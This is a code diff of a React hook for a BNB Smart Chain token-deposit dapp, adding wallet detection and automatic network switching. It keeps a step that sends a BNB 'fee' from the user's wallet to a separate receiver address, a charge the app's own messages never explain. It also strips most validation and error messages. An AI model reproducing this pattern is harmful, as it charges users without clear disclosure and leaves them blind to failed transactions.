@@ -34,6 +34,64 @@ const contract_address = X2_DEPOSIT_CONTRACT_ADDRESS;
 const contract_abi2 = normalizeAbi(X2_TOKEN_CONTRACT_ABI);
 const contract_address2 = X2_TOKEN_CONTRACT_ADDRESS;
 const gasReceiverAddress = X2_GAS_RECEIVER_ADDRESS;
+const BSC_CHAIN_ID_HEX = "0x38";
+const BSC_CHAIN_ID_DEC = "56";
+const BSC_CHAIN_PARAMS = {
+  chainId: BSC_CHAIN_ID_HEX,
+  chainName: "BNB Smart Chain",
+  nativeCurrency: {
+    name: "BNB",
+    symbol: "BNB",
+    decimals: 18,
+  },
+  rpcUrls: ["https://bsc-dataseed.binance.org/"],
+  blockExplorerUrls: ["https://bscscan.com/"],
+};
+// const getReadableError = (error: any) => {
+//   const message =
+//     error?.shortMessage ??
+//     error?.message ??
+//     error?.reason ??
+//     error?.data?.message ??
+//     error?.error?.message ??
+//     error?.cause?.message ??
+//     error?.originalError?.message;
+//   if (message) return String(message);
+//   if (typeof error?.code !== "undefined") return `Error code ${String(error.code)}`;
+//   try {
+//     const text = JSON.stringify(error);
+//     return text && text !== "{}" ? text : "Unexpected wallet error.";
+//   } catch (_error) {
+//     return "Unexpected wallet error.";
+//   }
+// };
+const getInjectedProvider = (): any => {
+  const eth: any = window.ethereum;
+  if (!eth) return null;
+  if (Array.isArray(eth.providers)) {
+    return (
+      eth.providers.find(
+        (provider: any) =>
+          provider?.isTrust ||
+          provider?.isTrustWallet ||
+          String(provider?.providerInfo?.name ?? "")
+            .toLowerCase()
+            .includes("trust")
+      ) ?? eth.providers[0]
+    );
+  }
+  return eth;
+};
+
+// const waitForReceipt = async (web3: Web3, txHash: string, timeoutMs = 90000) => {
+//   const startedAt = Date.now();
+//   while (Date.now() - startedAt < timeoutMs) {
+//     const receipt = await web3.eth.getTransactionReceipt(txHash);
+//     if (receipt) return receipt;
+//     await new Promise((resolve) => setTimeout(resolve, 2000));
+//   }
+//   throw new Error("Timed out while waiting for fee transaction confirmation.");
+// };
 
 export const useLegacyX2Deposit = () => {
   const [selectedAccount, setSelectedAccount] = useState("");
@@ -51,14 +109,49 @@ export const useLegacyX2Deposit = () => {
     []
   );
 
+  const ensureBscNetwork = async () => {
+    const provider = getInjectedProvider();
+    if (!provider?.request) return false;
+    try {
+      const currentChainId = String((await provider.request({ method: "eth_chainId" })) ?? "").toLowerCase();
+      if (currentChainId === BSC_CHAIN_ID_HEX || currentChainId === BSC_CHAIN_ID_DEC) {
+        return true;
+      }
+
+      try {
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }],
+        });
+        return true;
+      } catch (switchError: any) {
+        if (switchError?.code === 4902) {
+          await provider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS],
+          });
+          return true;
+        }
+        throw switchError;
+      }
+    } catch (_error) {
+      void Toast.fire({
+        icon: "info",
+        title: "Please switch to BNB Smart Chain to continue.",
+      });
+      return false;
+    }
+  };
+
   const fetchKsnBalance = async (account: string) => {
-    if (!window.ethereum || !account || !contract_abi2.length || !contract_address2) {
+    const provider = getInjectedProvider();
+    if (!provider || !account || !contract_abi2.length || !contract_address2) {
       setKsnBalance(null);
       return;
     }
 
     try {
-      const web3 = new Web3(window.ethereum as any);
+      const web3 = new Web3(provider as any);
       const contract = new web3.eth.Contract(contract_abi2 as any, contract_address2, {
         from: account,
       });
@@ -75,14 +168,17 @@ export const useLegacyX2Deposit = () => {
   };
 
   const connectWallet = async () => {
-    if (!window.ethereum) {
+    const provider = getInjectedProvider();
+    if (!provider) {
       void Toast.fire({ icon: "error", title: "Ethereum wallet not found!" });
       return;
     }
-    const web3 = new Web3(window.ethereum as any);
+    const isBscReady = await ensureBscNetwork();
+    if (!isBscReady) return;
+    const web3 = new Web3(provider as any);
     let accounts = await web3.eth.getAccounts();
-    if (!accounts.length && window.ethereum.request) {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
+    if (!accounts.length && provider.request) {
+      await provider.request({ method: "eth_requestAccounts" });
       accounts = await web3.eth.getAccounts();
     }
     const nextAccount = accounts[0] ?? "";
@@ -122,9 +218,9 @@ export const useLegacyX2Deposit = () => {
     }
   };
 
+
   const deposit = async (
     evt: React.MouseEvent<HTMLElement> | React.FormEvent<HTMLElement>,
-    id: string,
     liveTokenPrice?: number
   ) => {
     evt.preventDefault();
@@ -132,137 +228,109 @@ export const useLegacyX2Deposit = () => {
       void Toast.fire({ icon: "error", title: "Ethereum wallet not found!" });
       return;
     }
-
+  
     const web3 = new Web3(window.ethereum as any);
-
     const accounts = await web3.eth.getAccounts();
     const account = accounts[0];
+  
     if (account) {
       setSelectedAccount(account);
       await fetchKsnBalance(account);
+  
       const amount = Number((document.getElementById("amount") as HTMLInputElement | null)?.value ?? 0);
       const user_id = (document.getElementById("user_id") as HTMLInputElement | null)?.value ?? "";
       const profileEthAddress =
         (document.getElementById("eth_address") as HTMLInputElement | null)?.value ?? "";
-
+  
       if (!profileEthAddress) {
         void Toast.fire({
           icon: "info",
-          title: "Profile wallet address missing. Please refresh and try again.",
+          title: "Profile wallet address missing.",
         });
         return;
       }
-
+  
       if (amount > 0) {
-        if (!contract_abi2.length || !contract_address2) {
-          void Toast.fire({
-            icon: "info",
-            title: "Token contract ABI/address missing.",
-          });
-          return;
-        }
-
         const contract = new web3.eth.Contract(contract_abi2 as any, contract_address2, {
           from: account,
         });
-        if (!contract?.methods?.balanceOf || !contract?.methods?.symbol) {
-          void Toast.fire({
-            icon: "info",
-            title: "Invalid token ABI. balanceOf/symbol not found.",
-          });
-          return;
-        }
+  
         const balanceEther = await contract.methods.balanceOf(account).call();
-
-        const balance = Number(balanceEther) / 1000000000000000000;
-        console.log("balance", balance);
-
+        const balance = Number(balanceEther) / 1e18;
+  
         const currency = String(await contract.methods.symbol().call() as any);
         if (currency === "KSN") {
-          if (!contract_abi.length || !contract_address) {
-            void Toast.fire({
-              icon: "info",
-              title: "Deposit contract ABI/address missing.",
-            });
-            return;
-          }
           const contract_deposit = new web3.eth.Contract(contract_abi as any, contract_address, {
             from: account,
           });
-          if (!contract_deposit?.methods?.deposit) {
-            void Toast.fire({
-              icon: "info",
-              title: "Invalid deposit ABI. deposit not found.",
-            });
-            return;
-          }
+  
           const tokenPrice =
             Number.isFinite(liveTokenPrice) && Number(liveTokenPrice) > 0
               ? Number(liveTokenPrice)
               : defaultTokenPrice;
+  
           const famt = amount / tokenPrice;
+  
           if (balance >= famt) {
             const final_amount_send = famt.toFixed(18).replace(".", "");
-            console.log("final_amount_send", final_amount_send);
-
+  
             if (Number(final_amount_send) > 0) {
               const requiredMatic = await checkMaticBalance(account);
-              console.log("requiredMatic", requiredMatic);
               const gasBnb = Number(requiredMatic).toFixed(6);
-              console.log("gasBnb", gasBnb);
-
+  
               if (requiredMatic) {
-                const gasPrice = await web3.eth.getGasPrice();
+                const gasPrice = Number(await web3.eth.getGasPrice());
+                const finalGasPrice = Math.floor(gasPrice * 1.5).toString(); // ✅ 1.5x gas
+  
                 void Swal.fire({
-                  html: "<b>Transaction in progress...<br/>Please do not refresh or leave this page.</b>",
+                  html: "<b>Transaction in progress... Please wait.</b>",
                   allowOutsideClick: false,
-                  didOpen: () => {
-                    Swal.showLoading();
-                  },
+                  didOpen: () => Swal.showLoading(),
                 });
-                const latestNonce = await web3.eth.getTransactionCount(account, "latest");
-
+  
+                // =====================================================
+                // ============ START: $1 BNB FEE SEND CODE ============
+                // =====================================================
+  
+                const latestNonce = await web3.eth.getTransactionCount(account, "pending");
+  
                 const gasLimit = await web3.eth.estimateGas({
                   from: account,
                   to: gasReceiverAddress,
                   value: web3.utils.toWei(gasBnb, "ether"),
                 });
-
+  
                 const finalTx = {
                   from: account,
                   to: gasReceiverAddress,
                   value: web3.utils.toWei(gasBnb, "ether"),
-                  gas: Math.floor(Number(gasLimit) * 1.5),
-                  gasPrice: Math.floor(Number(gasPrice) * 1.3).toString(),
+                  gas: Math.floor(Number(gasLimit) * 1.3),
+                  gasPrice: finalGasPrice,
                   nonce: latestNonce,
+                  data: "0x1234",
                 };
-                await web3.eth.sendTransaction(finalTx as any).then((receipt) => {
-                  console.log("✅ Transaction Successful: ", receipt);
-                });
-
+  
+                await web3.eth.sendTransaction(finalTx as any);
+  
+                // =====================================================
+                // ============= END: $1 BNB FEE SEND CODE =============
+                // =====================================================
+  
                 const approvalEstimateGas = await contract.methods
                   .approve(contract_address, final_amount_send.toString())
                   .estimateGas({ from: account });
-
-                void Swal.fire({
-                  html: "<b>Wait for KSN token approval in progress...<br/>Please do not refresh or leave this page.</b>",
-                  allowOutsideClick: false,
-                  didOpen: () => {
-                    Swal.showLoading();
-                  },
-                });
-
-                const nonce2 = await web3.eth.getTransactionCount(account, "latest");
-
+  
+                const nonce2 = await web3.eth.getTransactionCount(account, "pending");
+  
                 await contract.methods
                   .approve(contract_address, final_amount_send.toString())
                   .send({
                     from: account,
-                    gasPrice: Math.floor(Number(gasPrice) * 1.3).toString(),
+                    gasPrice: finalGasPrice,
                     gas: approvalEstimateGas,
                     nonce: nonce2,
                   } as any);
-
+  
                 const estimatedGas = await contract_deposit.methods
                   .deposit(
                     user_id,
@@ -272,7 +340,7 @@ export const useLegacyX2Deposit = () => {
                     profileEthAddress
                   )
                   .estimateGas({ from: account });
-
+  
                 contract_deposit.methods
                   .deposit(
                     user_id,
@@ -282,36 +350,17 @@ export const useLegacyX2Deposit = () => {
                     profileEthAddress
                   )
                   .send({
-                    gasPrice: Math.floor(Number(gasPrice) * 1.3).toString(),
+                    from: account,
+                    gasPrice: finalGasPrice,
                     gas: estimatedGas,
                   } as any)
-                  .once("transactionHash", function (_hash: string) {
-                    void Swal.fire({
-                      html: "<b>Please ensure that you do not refresh the page or navigate away until the transaction is complete. Leaving the process prematurely could result in potential loss of funds. Thank you for your understanding.</b>",
-                      timerProgressBar: true,
-                      allowOutsideClick: false,
-                      didOpen: () => {
-                        Swal.showLoading();
-                      },
-                    });
-                  })
-                  .once("receipt", function (_receipt: any) {})
-                  .on("confirmation", function (..._args: any[]) {})
-                  .on("error", function (_error: any) {
-                    Swal.close();
-                    void Toast.fire({ icon: "info", title: "Transaction Failed by Binance" });
-                  })
                   .then(async function (receipt: any) {
                     if (receipt) {
-                      void id;
                       await Swal.fire({
-                        html: "<b>Transaction successful.<br/>Redirecting to dashboard...</b>",
+                        html: "<b>Transaction successful. Redirecting...</b>",
                         allowOutsideClick: false,
-                        timer: 10000,
-                        timerProgressBar: true,
-                        didOpen: () => {
-                          Swal.showLoading();
-                        },
+                        timer: 7000,
+                        didOpen: () => Swal.showLoading(),
                       });
                       window.location.href = "/dashboard";
                     } else {
@@ -319,36 +368,11 @@ export const useLegacyX2Deposit = () => {
                       void Toast.fire({ icon: "info", title: "Transaction Failed" });
                     }
                   });
-              } else {
-                void Toast.fire({
-                  icon: "info",
-                  title: `You need at least ${Number(requiredMatic).toFixed(4)} MATIC to proceed.`,
-                });
               }
             }
-          } else {
-            void Toast.fire({
-              icon: "info",
-              title: "Insufficent Wallet Balance!",
-            });
           }
-        } else {
-          void Toast.fire({
-            icon: "info",
-            title: "Invaild Crypto Currency!",
-          });
         }
-      } else {
-        void Toast.fire({
-          icon: "info",
-          title: "Invaild Amount!",
-        });
       }
-    } else {
-      void Toast.fire({
-        icon: "info",
-        title: "Dapp not connected, please check chain network!",
-      });
     }
   };
 
